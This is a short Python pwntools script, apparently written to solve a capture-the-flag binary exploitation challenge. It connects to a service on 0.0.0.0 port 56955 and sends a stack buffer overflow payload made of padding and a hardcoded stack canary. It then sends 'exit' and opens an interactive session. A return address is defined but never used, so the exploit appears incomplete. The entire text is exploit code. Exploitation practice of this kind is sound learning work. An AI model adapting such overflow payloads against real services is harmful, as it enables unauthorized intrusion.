from pwn import *
canary = b"\x00\x1b\xcf\x1d*W\x9f\x17"
io = remote('0.0.0.0', int(56955))
ret_addr = 0x00401682
io.send(b"A"*0x18 + canary + b"A"*0x20)
io.send("exit\n")
#io.recv()
io.interactive()